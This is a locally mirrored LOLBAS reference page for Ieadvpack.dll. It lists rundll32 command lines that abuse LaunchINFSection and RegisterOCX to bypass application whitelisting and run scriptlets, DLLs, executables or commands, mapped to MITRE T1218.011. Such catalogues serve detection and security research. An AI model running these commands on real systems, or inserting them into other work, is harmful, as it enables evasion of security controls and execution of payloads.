# LOLBAS: Ieadvpack.dll

[[00-inicio|Inicio]] · [[Referencias|Referencias]] · [[LOLBAS|Índice LOLBAS]]

> Fuente: [https://lolbas-project.github.io/](https://lolbas-project.github.io/) · Licencia: **GPL-3.0** · Espejo local generado desde el repositorio oficial.

LOLBAS — binarios legitimos de Windows usables como atacante (living off the land).

**Categorías:** `AWL Bypass`, `Execute`

INF installer for Internet Explorer. Has much of the same functionality as advpack.dll.

## Comandos

### Run local or remote script(let) code through INF file specification.

AWL Bypass · priv: User · T1218.011

```cmd
rundll32.exe ieadvpack.dll,LaunchINFSection {PATH_ABSOLUTE:.inf},DefaultInstall_SingleUser,1,
```

Execute the specified (local or remote) .wsh/.sct script with scrobj.dll in the .inf file by calling an information file directive (section name specified).

### Run local or remote script(let) code through INF file specification.

AWL Bypass · priv: User · T1218.011

```cmd
rundll32.exe ieadvpack.dll,LaunchINFSection {PATH_ABSOLUTE:.inf},,1,
```

Execute the specified (local or remote) .wsh/.sct script with scrobj.dll in the .inf file by calling an information file directive (DefaultInstall section implied).

### Load a DLL payload.

Execute · priv: User · T1218.011

```cmd
rundll32.exe ieadvpack.dll,RegisterOCX {PATH:.dll}
```

Launch a DLL payload by calling the RegisterOCX function.

### Run an executable payload.

Execute · priv: User · T1218.011

```cmd
rundll32.exe ieadvpack.dll,RegisterOCX {PATH:.exe}
```

Launch an executable by calling the RegisterOCX function.

### Run an executable payload.

Execute · priv: User · T1218.011

```cmd
rundll32 ieadvpack.dll, RegisterOCX {CMD}
```

Launch command line by calling the RegisterOCX function.

